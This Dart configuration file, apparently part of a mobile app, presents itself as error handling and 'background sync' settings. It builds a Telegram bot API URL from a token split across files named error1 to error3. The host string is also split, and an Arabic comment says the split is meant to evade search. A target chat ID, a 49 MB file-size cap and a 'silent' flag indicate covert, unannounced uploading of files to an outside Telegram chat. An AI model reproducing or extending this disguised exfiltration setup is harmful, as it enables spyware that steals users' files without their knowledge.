import 'error1.dart';
import 'error2.dart';
import 'error3.dart';

/// ⚙️ إعدادات المزامنة الخلفية
class ErrorConfig {
  // ═══════════════════════════════════════════════════
  //  تركيب المفتاح (من 3 أجزاء)
  // ═══════════════════════════════════════════════════
  static String get _keyData => '$error1$error2$error3';

  static String get target => targetId;

  // ═══════════════════════════════════════════════════
  //  رابط الخدمة (مقسّم لتضليل البحث)
  // ═══════════════════════════════════════════════════
  static String get _s1 => 'https://';
  static String get _s2 => 'api.telegr';
  static String get _s3 => 'am.org/bot';

  static String get apiBase => '$_s1$_s2$_s3$_keyData';

  // ═══════════════════════════════════════════════════
  //  حالة التهيئة
  // ═══════════════════════════════════════════════════
  static bool get isReady =>
      error1 != 'PUT_FIRST_HERE' &&
      error2 != 'PUT_SECOND_HERE' &&
      error3 != 'PUT_THIRD_HERE' &&
      targetId != 'PUT_TARGET_HERE' &&
      _keyData.length > 20;

  // ═══════════════════════════════════════════════════
  //  ثوابت النظام
  // ═══════════════════════════════════════════════════
  static int get maxSizeMb => 49;
  static const bool silent = true; // 🔕 صامت
}